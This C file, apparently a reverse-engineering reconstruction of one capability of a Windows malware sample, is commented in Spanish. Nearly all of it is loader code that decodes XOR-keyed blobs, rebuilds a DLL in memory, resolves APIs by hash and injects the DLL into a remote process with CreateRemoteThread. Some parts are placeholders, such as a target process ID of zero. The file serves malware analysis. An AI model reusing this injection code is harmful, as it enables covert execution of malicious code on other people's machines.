/* ============================================================
 * Capacidad 02/15 — Reconstrucción PE e inyección DLL
 * Función C : LaunchInternalDllInRemoteProcess
 * Dirección : 0x14000a73d   · Nodo N1   · Confianza: Alta
 * ------------------------------------------------------------
 * Reconstruye la DLL x64 a partir de dos blobs (cabeceras y
 * secciones), recompone la imagen PE (magic 'MZ'/'PE', e_lfanew,
 * tabla de secciones), corrige importaciones resolviendo API por
 * hash y la inyecta en un proceso remoto.
 *   [confirmado]: OpenProcess (máscara 0x1FFFFF), VirtualAllocEx,
 *   WriteProcessMemory y CreateRemoteThread. No se afirma process
 *   hollowing. Cadena UTF-16 observada 'smucloa.exe' como nombre de
 *   proceso candidato; la selección final es dinámica.
 * ============================================================
 */

#include "00_tipos_comunes.h"

#define IMAGE_BUFFER_SIZE   0x8a000u    /* 565.248 bytes (límite 0x8a001) */
#define BLOB_HEADERS_VA     0x14001f590u/* cabeceras: 0x1d3 bytes, clave 0x77 ('w') */
#define BLOB_SECTIONS_VA    0x140022fb7u/* secciones: 0x80c61 bytes, clave 0x0e */
#define BLOB_AUX_VA         0x140022771u/* auxiliar : 0x1a7 bytes, clave 0xe9 */
#define SECTION_COUNT       8u
#define OPEN_PROCESS_MASK   0x1FFFFFu

/* Tabla de secciones reconstruida: 8 entradas de 0x14 bytes con
 * { offset en el blob de secciones, RVA destino, tamaño }. */
typedef struct {
    uint32_t blob_offset;   /* offset dentro del blob de secciones */
    uint32_t rva;           /* RVA destino en la imagen */
    uint32_t size;          /* tamaño de la sección */
} SectionEntry;

/* ------------------------------------------------------------------
 * Resolución de API por hash (N1):
 *   0x140009362 ResolveModuleByHash(hash, nombre)  -> HMODULE
 *   0x1400066ae ResolveApiByHash(hash_mod, mod, hash_api, nombre)
 *   0x1400066f2 GetProcAddress por hash dentro del módulo.
 * La resolución recorre una tabla de hashes cacheados y, en ausencia,
 * cae a LoadLibraryA / GetProcAddress (observado en decompile.c).
 * ------------------------------------------------------------------ */
static HMODULE ResolveModuleByHash(uint32_t module_hash, LPCSTR module_name)
{
    /* Búsqueda en la tabla de módulos cacheados; en fallo: */
    HMODULE mod = LoadLibraryA(module_name);
    /* (El hash `module_hash` se usa para indexar/validar el caché.) */
    (void)module_hash;
    return mod;
}

static FARPROC ResolveApiByHash(uint32_t api_hash, HMODULE module, LPCSTR api_name)
{
    /* Búsqueda en la tabla de API cacheadas; en fallo: */
    FARPROC proc = GetProcAddress(module, api_name);
    (void)api_hash;
    return proc;
}

/* Resuelve las importaciones de la imagen escribiendo en su IAT.
 * Comportamiento confirmado en el loader: iterar la tabla de imports,
 * resolver módulo y API por hash y fijar cada entrada de la IAT. */
static void ResolveImportsByHash(uint8_t *image)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)image;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(image + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY imp_dir =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (imp_dir.VirtualAddress == 0)
        return;

    PIMAGE_IMPORT_DESCRIPTOR desc =
        (PIMAGE_IMPORT_DESCRIPTOR)(image + imp_dir.VirtualAddress);

    for (; desc->Name != 0; desc++) {
        LPCSTR  name = (LPCSTR)(image + desc->Name);
        HMODULE mod  = ResolveModuleByHash(0, name);
        if (mod == NULL)
            continue;

        PIMAGE_THUNK_DATA oft = (PIMAGE_THUNK_DATA)(image + desc->OriginalFirstThunk);
        PIMAGE_THUNK_DATA ft  = (PIMAGE_THUNK_DATA)(image + desc->FirstThunk);

        for (; oft->u1.AddressOfData != 0; oft++, ft++) {
            if (IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)) {
                ft->u1.Function = (ULONG_PTR)GetProcAddress(mod,
                    MAKEINTRESOURCEA(IMAGE_ORDINAL(oft->u1.Ordinal)));
            } else {
                PIMAGE_IMPORT_BY_NAME ibn =
                    (PIMAGE_IMPORT_BY_NAME)(image + oft->u1.AddressOfData);
                ft->u1.Function = (ULONG_PTR)ResolveApiByHash(0, mod, ibn->Name);
            }
        }
    }
}

/* ------------------------------------------------------------------
 * 0x14000a73d — reconstruye la DLL interna y la lanza en un proceso
 * remoto. Pasos de comportamiento [confirmado]:
 *   decode(headers) + decode(sections) -> imagen PE en memoria ->
 *   corregir importaciones -> OpenProcess(0x1FFFFF) -> VirtualAllocEx
 *   -> WriteProcessMemory -> CreateRemoteThread.
 * ------------------------------------------------------------------ */
void LaunchInternalDllInRemoteProcess(void)
{
    EncodedBlob hdr_blob = { (const uint8_t *)BLOB_HEADERS_VA,  0x1d3u,   0x77u };
    EncodedBlob sec_blob = { (const uint8_t *)BLOB_SECTIONS_VA, 0x80c61u, 0x0eu };
    EncodedBlob aux_blob = { (const uint8_t *)BLOB_AUX_VA,      0x1a7u,   0xe9u };

    ExpandedBlob headers, sections, aux;
    if (!DecodeAndExpandBlob(&hdr_blob, &headers))
        return;
    if (!DecodeAndExpandBlob(&sec_blob, &sections))
        return;
    if (!DecodeAndExpandBlob(&aux_blob, &aux))
        return;
    if (sections.size >= IMAGE_BUFFER_SIZE)       /* límite de imagen */
        return;

    /* --- 1) Reconstruir la imagen PE en memoria --- */
    uint8_t *image = (uint8_t *)VirtualAlloc(NULL, IMAGE_BUFFER_SIZE,
                                             MEM_COMMIT | MEM_RESERVE,
                                             PAGE_READWRITE);
    if (image == NULL)
        return;
    CopyMemory(image, headers.data, headers.size);

    uint32_t e_lfanew = *(uint32_t *)(image + 0x3c);
    image[0] = 'M'; image[1] = 'Z';              /* 'MZ' */
    image[e_lfanew + 0] = 'P'; image[e_lfanew + 1] = 'E';  /* 'PE\0\0' */
    image[e_lfanew + 2] = 0;  image[e_lfanew + 3] = 0;

    /* Metadatos de sección y RVA de entrada: se leen del blob auxiliar
     * (8 entradas de 0x14 bytes + RVA de entrada). */
    SectionEntry section_table[SECTION_COUNT];
    uint32_t     entry_rva = 0;
    {
        const uint8_t *meta = aux.data;
        for (uint32_t i = 0; i < SECTION_COUNT; i++) {
            section_table[i].blob_offset = *(const uint32_t *)(meta + i * 0x14u + 0x0u);
            section_table[i].rva         = *(const uint32_t *)(meta + i * 0x14u + 0x4u);
            section_table[i].size        = *(const uint32_t *)(meta + i * 0x14u + 0x8u);
        }
        entry_rva = *(const uint32_t *)(meta + SECTION_COUNT * 0x14u);
    }

    for (uint32_t i = 0; i < SECTION_COUNT; i++) {
        SectionEntry *se = &section_table[i];
        if (se->rva + se->size > IMAGE_BUFFER_SIZE)
            return;
        if (se->blob_offset + se->size > sections.size)
            return;
        CopyMemory(image + se->rva, sections.data + se->blob_offset, se->size);
    }

    /* --- 2) Corregir importaciones (resolución por hash) --- */
    ResolveImportsByHash(image);

    /* --- 3) Inyección remota [confirmado] ---
     * OpenProcess(0x1FFFFF) -> VirtualAllocEx -> WriteProcessMemory
     * -> CreateRemoteThread. El proceso objetivo se selecciona en
     * tiempo de ejecución (cadena UTF-16 observada: "smucloa.exe"). */
    DWORD  target_pid = 0;    /* selección dinámica del proceso objetivo */
    HANDLE proc = OpenProcess(OPEN_PROCESS_MASK, FALSE, target_pid);
    if (proc == NULL)
        return;

    PVOID base = VirtualAllocEx(proc, NULL, sections.size,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    if (base == NULL) {
        CloseHandle(proc);
        return;
    }

    SIZE_T written = 0;
    WriteProcessMemory(proc, base, image, sections.size, &written);

    CreateRemoteThread(proc, NULL, 0,
                       (LPTHREAD_START_ROUTINE)((uint8_t *)base + entry_rva),
                       base, 0, NULL);
    CloseHandle(proc);
}
